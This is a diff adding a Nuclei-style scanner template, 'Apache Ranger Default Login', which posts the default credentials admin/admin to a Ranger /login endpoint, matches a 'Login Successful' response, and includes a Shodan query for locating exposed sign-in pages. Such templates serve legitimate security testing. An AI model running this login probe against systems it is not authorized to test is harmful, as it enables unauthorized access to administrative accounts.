@@ -1,0 +1,38 @@
+id: ranger-default-login
+info:
+  author: For3stCo1d
+  metadata:
+    shodan-query: http.title:"Ranger - Sign In"
+  name: Apache Ranger Default Login
+  reference: https://github.com/apache/ranger
+  severity: high
+  tags: apache,ranger,default-login
+requests:
+- attack: pitchfork
+  matchers:
+  - condition: and
+    part: body
+    type: word
+    words:
+    - '"statusCode":200'
+    - '"msgDesc":"Login Successful"'
+  - status:
+    - 200
+    type: status
+  matchers-condition: and
+  payloads:
+    pass:
+    - admin
+    user:
+    - admin
+  raw:
+  - 'POST /login HTTP/1.1
+
+    Host: {{Hostname}}
+
+    Content-Type: application/x-www-form-urlencoded; charset=UTF-8
+
+
+    username={{user}}&password={{pass}}
+
+    '
